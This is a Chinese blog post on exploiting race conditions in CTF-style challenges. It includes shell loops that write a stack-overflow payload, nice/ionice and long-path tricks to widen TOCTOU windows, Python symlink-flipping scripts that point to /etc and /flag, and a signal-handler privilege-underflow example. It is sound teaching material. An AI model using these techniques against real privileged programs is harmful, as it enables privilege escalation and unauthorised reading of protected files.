---
layout: post
tags: [pwn]
title: "race conditions利用技巧"
author: wsxk
date: 2024-12-23
comments: true
---

- [0. 写在前面](#0-写在前面)
- [1. races in filesystem](#1-races-in-filesystem)
  - [1.1 通用解](#11-通用解)
  - [1.2 多进程运行](#12-多进程运行)
  - [1.3 降低目标执行速度](#13-降低目标执行速度)
    - [1.3.1 nice](#131-nice)
    - [1.3.2 Path Complexity](#132-path-complexity)
  - [1.4 复杂场景下races in filesystem的利用](#14-复杂场景下races-in-filesystem的利用)
    - [1.4.1 符号链接race](#141-符号链接race)
    - [1.4.2 变种](#142-变种)
- [2. races in memory](#2-races-in-memory)
  - [2.1 利用signals](#21-利用signals)

# 0. 写在前面<br>
`race conditions`的利用，最关键的时候是确定窗口期在哪里，比如:<br>
```c
int main(int argc, char **argv) {
    int echo_fd = open("/bin/echo", O_RDONLY);
    int fd = open(argv[1], O_WRONLY | O_CREAT, 0755);
    sendfile(fd, echo_fd, 0, 1024*1024);
    close(fd);
    execl(argv[1], argv[1], "SAFE", NULL);
}
```
对于这个函数，窗口期在**close之后，execl之前**<br>
所以我们的核心目的是在窗口期前，将`argv[1]`的文件内容刷成我们想要的`shellcode`即可。<br>
提高利用效果的核心思路有2个：**提高攻击执行速度（比如，完整的执行一次攻击步骤能在窗口期内完成），降低目标执行速度（延长窗口期时间）**<br>
**另外要注意的一点是，降低目标执行速度，理想情况是 只延长窗口期（目标执行其他步骤时越快越好）；然而现实情况却是，延长窗口期的办法，往往也会延长目标执行其他步骤的时间！所以这个办法很难有效**<br>
**通常情况下，快速的执行攻击步骤即可解决问题**<br>

# 1. races in filesystem<br>
## 1.1 通用解<br>
通常情况下，想要利用race condition通常都要开启两个terminal,然后运行如下命令:<br>

```
terminal A:
while true; do echo a> 1;echo -n $(printf 'a%.0s' {1..260}) >1; done

# 若想通过race condition触发栈溢出，可以使用下面的写法：事实证明echo -ne比printf快且好使！
# while true; do echo a>1;echo -ne "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd6\x12@\x00\x00\x00\x00\x00" > 1; done


terminal B:
for i in $(seq 1 2000); do /path/to/your/target 1; done | tee output
sort output | uniq -c 
```
通常都能利用成功<br>

## 1.2 多进程运行<br>
虽然通常情况下race condition只要开启两个terminal就可以了，但是实际上我们可以开启多个terminal:<br>
```
terminal A:
while true;do for i in $(seq 1 2000);do /path/to/your/target aa/etc/1;done | grep flag; done

terminal B:
while true;do for i in $(seq 1 2000);do /path/to/your/target aa/etc/1;done | grep flag; done

terminal C:
while true;do for i in $(seq 1 2000);do /path/to/your/target aa/etc/1;done | grep flag; done

terminal D:
while true;do for i in $(seq 1 2000);do /path/to/your/target aa/etc/1;done | grep flag; done

terminal E:
while true; do xxx ; done
```


## 1.3 降低目标执行速度<br>
### 1.3.1 nice<br>
`nice`命令和`nice system call`允许用户设置进程在`linux kernel`调度器中的优先级。<br>
`linux kernel scheduler`的优先级从高到低 为-20~19，优先级越高的进程，能够获得cpu资源的比例就越高<br>
`ionice`的用法和`nice`差不多，只不过它设置的是进程的io调度优先级，优先级从高到低是0~7，<br>
**这种方法的思路就是通过降低进程在系统中被执行的优先级，从而提高空窗期**<br>

用法如下:<br>
```
1. 启动一个terminal， 运行 while /bin/true; do cp -v catflag asdf; done
2. 再启动一个terminal，运行 for i in $(seq 1 2000); do nice -n 19 ./fs2 asdf; done | tee output
   运行sort output | uniq -c
```
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2024-9-25/20241214001123.png)
可以看到，概率还是命中次数差不多提升了一倍。<br>
`ionice也有差不多的效果`<br>
```
for i in $(seq 1 2000); do ionice -n 7 ./fs2 asdf; done | tee output
sort output | uniq -c
```
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2024-9-25/20241214102238.png)
两者结合，使用效果更佳:<br>
```
for i in $(seq 1 2000); do nice -n 19 ionice -n 7 ./fs2 asdf; done | tee output
sort output | uniq -c
```
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2024-9-25/20241214102358.png)


### 1.3.2 Path Complexity<br>
`filesystem race`涉及到文件系统访问，但是 不是所有的文件系统访问都是想等的<br>
```
cat my_file 比
cat a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/my_file
快得多！
因为内核需要花时间进入这些目录！
```
**这给了我们一个灵感：即可以传超级长路径来降低程序访问文件的速度,从而提高空窗期(需要注意，linux的路径限制最长为4096字节)**<br>
**另外，我们还可以通过符号链接来延长路径**<br>
```
for i in $(seq 1 2000); do ./fs2 a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/s/y/z/link/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/s/y/z/link/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/s/y/z/link/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/s/y/z/link/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/s/y/z/link/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/s/y/z/link/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/s/y/z/link/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/s/y/z/link/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/s/y/z/link/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/s/y/z/link/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/s/y/z/link/asdf ; done | tee output
sort output | uniq -c
```
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2024-9-25/20241215152509.png)
随着路径变长，成功的概率还能提高！<br>
这种`race condition`也导致了**TOCTOU(Time of check to Time of use)问题**<br>


## 1.4 复杂场景下races in filesystem的利用<br>
### 1.4.1 符号链接race<br> 
```
1、判断文件/目录 是否是符号链接(lstat 不解析符号链接)，不是符号链接，进入下一步
2、检查文件/目录所在的上级目录(stat)是否被root持有，被root持有，进入下一步
3、检查文件/目录所在的上级目录(stat)是否被root group持有，被root group持有，进入下一步
4、检查其他用户能否写该上级目录，如果不能，进入下一步
```
`lstat和stat的区别在于，lstat遇到符号链接会解析其本身，而stat会解析到符号链接指向的文件！`<br>
race思路:<br>
```
-------------创建文件/home/wsxk/a/1，是正常文件
1、判断文件/目录 是否是符号链接(lstat 不解析符号链接)，不是符号链接，进入下一步
-------------改变文件/home/wsxk/a的文件类型，使其为符号链接，指向/etc
2、检查文件/目录所在的上级目录(stat)是否被root持有，被root持有，进入下一步
3、检查文件/目录所在的上级目录(stat)是否被root group持有，被root group持有，进入下一步
4、检查其他用户能否写该上级目录，如果不能，进入下一步
-------------改变文件/home/wsxk/a的文件类型，为正常目录；改变/home/wsxk/a/1的文件类型为符号链接，指向/flag
```
**如果race的check条件有很多条，我们只需要单独满足那些条件中每一个即可,即如果有4个check，我们只需要改变4次状态，每次我们只考虑满足一个约束**<br>
实际编写脚本时，是这样写的:<br>
```
while true; do rm -rf aa &&mkdir -p aa && echo "1" > aa/1;rm -rf aa && ln -s /etc aa;rm aa && mkdir -p aa && ln -s /flag aa/1; done
```
但是用shell脚本执行太慢了，用python会更快一点:<br>
```python
import os
import shutil
import time

while True:
    # Step 1: rm -rf aa && mkdir -p aa && touch aa/1
    shutil.rmtree('aa')  # 递归删除目录 aa
    os.makedirs('aa', exist_ok=True)  # 创建目录 aa
    with open('aa/1', 'w') as f:  # 创建文件 aa/1
        f.write('')  # 空文件，可以写入内容

    # Step 2: rm -rf aa && ln -s /etc aa
    shutil.rmtree('aa')  # 递归删除目录 aa
    os.symlink('/etc', 'aa')  # 创建符号链接 aa -> /etc

    # Step 3: rm aa && mkdir -p aa && ln -s /flag aa/1
    os.remove('aa')  # 删除符号连接 aa
    os.makedirs('aa', exist_ok=True)  # 创建目录 aa
    os.symlink('/flag', 'aa/1')  # 创建符号链接 aa/1 -> /flag
```
### 1.4.2 变种<br>
```
1、判断文件/目录 是否是符号链接(lstat 不解析符号链接)，不是符号链接，进入下一步
2、检查文件/目录所在的上级目录(lstat)是否被root持有，被root持有，进入下一步
3、检查文件/目录所在的上级目录(lstat)是否被root group持有，被root group持有，进入下一步
4、检查其他用户能否写该上级目录，如果不能，进入下一步
```
首先需要明白，在**linux中，stat和lstat都是查询文件的状态（目录是特殊的文件）,虽然lstat解析符号文件本身，但是在处理路径中，是会处理符号链接的，比如lstat("aa/bb/cc/dd"),其中cc是符号链接，指向"/"，实际上会执行的是lstat("/dd")**<br>
根据这个特性，思路就很清晰了:<br>
```
-------------创建文件/home/wsxk/a/etc/1，是正常文件
1、判断文件/目录 是否是符号链接(lstat 不解析符号链接)，不是符号链接，进入下一步
-------------改变文件/home/wsxk/a的文件类型，使其为符号链接，指向/
2、检查文件/目录所在的上级目录(lstat)是否被root持有，被root持有，进入下一步
3、检查文件/目录所在的上级目录(lstat)是否被root group持有，被root group持有，进入下一步
4、检查其他用户能否写该上级目录，如果不能，进入下一步
-------------改变文件/home/wsxk/a的文件类型，为正常目录；改变/home/wsxk/a/etc/1的文件类型为符号链接，指向/flag
```
脚本如下:<br>

```python
import os
import shutil
import time

while True:
    # Step 1: rm -rf aa && mkdir -p aa/etc && touch aa/etc/1
    shutil.rmtree('aa')
    os.makedirs('aa/etc', exist_ok=True)
    with open('aa/etc/1', 'w') as f:  
        f.write('')

    # Step 2: rm -rf aa && ln -s / aa
    shutil.rmtree('aa') 
    os.symlink('/', 'aa')

    # Step 3: rm aa && mkdir -p aa/etc && ln -s /flag aa/etc/1
    os.remove('aa')  
    os.makedirs('aa/etc', exist_ok=True)
    os.symlink('/flag', 'aa/etc/1')
```
**这里需要配合多进程来提高成功概率**<br>

# 2. races in memory<br>
## 2.1 利用signals<br>
`races in memory`成功利用通常需要依靠`signals`来辅助利用<br>
举例来说,有一个程序注册了一个`signal handler`<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2024-9-25/20241230235506.png)<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2024-9-25/20241230235553.png)
这是一个时间到了就退出的处理函数<br>
而用户也可以手动退出<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2024-9-25/20241230235621.png)<br>
这就导致了一个问题：**如果在privilege_level校验通过且还没执行到--privilege_level时，触发signal handler，那么privilege_level会被设置为0，--privilege_level会导致整数溢出，使privilege_level变成一个超大值**<br>



<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-C22S5YSYL7');
</script>